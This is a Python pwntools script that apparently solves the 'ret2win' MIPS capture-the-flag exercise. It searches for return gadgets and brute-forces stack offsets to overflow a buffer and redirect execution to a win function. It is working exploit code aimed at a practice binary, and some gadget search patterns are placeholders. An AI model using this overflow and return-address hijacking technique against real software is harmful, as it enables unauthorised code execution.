#!/usr/bin/env python3
from pwn import *

context.arch = "mips"
elf = ELF("./ret2win_mipsel")
rop = ROP(elf)

win_addr = elf.symbols["ret2win"]
print(f"ret2win address: {hex(win_addr)}")

# Look for return gadgets
print("\n[*] Searching for gadgets...")

# Common MIPS return gadgets
gadgets_to_find = [
    "jr $ra",
    "jr ra",
    "lw $ra, offset($sp)",
    "addiu $sp, $sp, offset",
]

found_gadgets = {}
for pattern in gadgets_to_find:
    gadget = rop.find_gadget([pattern])
    if gadget:
        found_gadgets[pattern] = gadget.address
        print(f"[+] Found {pattern}: {hex(gadget.address)}")

if not found_gadgets:
    print("[!] No gadgets found via ROP search")
    print("[*] Trying to find jr $ra manually...")

    # Try to find common gadget addresses
    # Disassemble some code to look for jr $ra
    code = elf.read(elf.entry, 1000)
    # Search for jr $ra pattern (0x03e00008 in MIPS little-endian)
    jr_ra_pattern = b"\x08\x00\xe0\x03"  # jr $ra in little-endian

    for i in range(len(code) - 4):
        if code[i: i + 4] == jr_ra_pattern:
            addr = elf.entry + i
            print(f"[+] Found jr $ra at: {hex(addr)}")
            found_gadgets["jr $ra"] = addr
            break

# If we found a gadget, use it
if found_gadgets:
    ret_gadget = list(found_gadgets.values())[0]
    print(f"\n[*] Using gadget: {hex(ret_gadget)}")

    # Try different stack alignments
    for offset in [40, 44, 48, 52]:
        print(f"\n=== Testing offset {offset} ===")

        p = process(["qemu-mipsel", "-L", "/usr/mipsel-linux-gnu", elf.path])
        p.recvuntil(b"> ")

        # Build payload with ret gadget
        payload = b"A" * offset
        payload += p32(ret_gadget)  # Return gadget first
        payload += p32(win_addr)  # Then win function

        print(f"Payload: {len(payload)} bytes")
        p.sendline(payload)

        try:
            response = p.recvall(timeout=2)
            if response:
                print(f"Output: {response[:100]}...")
                if b"flag" in response.lower():
                    print(f"\n[SUCCESS] Offset {offset}")
                    print(response.decode())
                    break
            else:
                print("No output")
        except:
            print("Crash/timeout")

        p.close()
else:
    print("[!] Could not find any gadgets")
    print("[*] Trying without gadget...")

    # Maybe the function just needs to return to a valid address
    # Try jumping to _exit or similar
    exit_addr = elf.symbols.get("_exit") or elf.symbols.get("exit")
    if exit_addr:
        print(f"[*] Found exit at: {hex(exit_addr)}")

        for offset in [40, 44, 48]:
            print(f"\n=== Testing offset {offset} with exit ===")

            p = process(
                ["qemu-mipsel", "-L", "/usr/mipsel-linux-gnu", elf.path])
            p.recvuntil(b"> ")

            payload = b"A" * offset
            payload += p32(win_addr)  # Call win function
            payload += p32(exit_addr)  # Then exit cleanly

            print(f"Payload: {len(payload)} bytes")
            p.sendline(payload)

            try:
                response = p.recvall(timeout=2)
                if response:
                    print(f"Output: {response[:100]}...")
                    if b"flag" in response.lower():
                        print(f"\n[SUCCESS] Offset {offset}")
                        print(response.decode())
                        break
                else:
                    print("No output")
            except:
                print("Crash/timeout")

            p.close()
